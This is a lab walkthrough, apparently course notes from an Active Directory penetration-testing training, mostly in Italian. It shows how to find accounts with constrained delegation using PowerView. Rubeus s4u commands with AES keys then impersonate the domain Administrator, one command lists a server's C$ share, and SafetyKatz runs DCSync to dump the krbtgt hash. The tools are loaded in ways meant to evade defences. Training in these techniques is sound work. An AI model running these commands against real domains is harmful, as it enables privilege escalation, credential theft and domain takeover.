# LEARNING OBJECTIVE16

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Enumerate users in the domain for whom Constrained Delegation is enabled.
   1. For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
   2. &#x20;Pass the ticket and access the service as DA.
2. &#x20;Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
   1. For such a user, request a TGT from the DC.
   2. Use the TGS for executing the DCSync attack.

### SVOLGIMENTO 1

Lanciamo un promp amminstrativo, eseguiamo InviShell, e importiamo PowerView per identificare utenze che hanno Constained Delegation

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\PowerView.ps1
```

```powershell
Get-DomainUser -TrustedToAuth
```

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

Abbiamo identificato l'utente web svc con i rispettivi dati

msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}

objectsid : S-1-5-21-719815819-3726368948-3917688648-1114

### SVOLGIMENTO 1a

Abuse Constrained Delegationutilizzando websvc con Rubeus\
Nel comando riportato di seguito, richiediamo un TGS per websvc come amministratore di dominio - amministratore. Quindi il TGS viene utilizzato per accedere al servizio specificato nel parametro /msdsspn (che è il filesystem su dcorp-mssql):

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

### SVOLGIMENTO 1b

Proviamo ad accedere il filesystem on dcorp-mssql:

```powershell
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

### SVOLGIMENTO 2

Lanciamo un promp amminstrativo, eseguiamo InviShell, e importiamo PowerView per identificare host che hanno Constained Delegation

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\PowerView.ps1
```

```powershell
Get-DomainComputer -TrustedToAuth
```

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

### SVOLGIMENTO 2a

Abusare Constrained Delegation usando dcorp-adminsrv with Rubeus: Abbiamo le chiavi AES di dcorp-adminsrv$ dal computer dcorp-adminsrv. Eseguire il comando riportato di seguito da un prompt dei comandi con privilegi elevati, poiché sarà necessario per DCSync:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

Adesso possiamo fare DCsync&#x20;

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"s
```

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
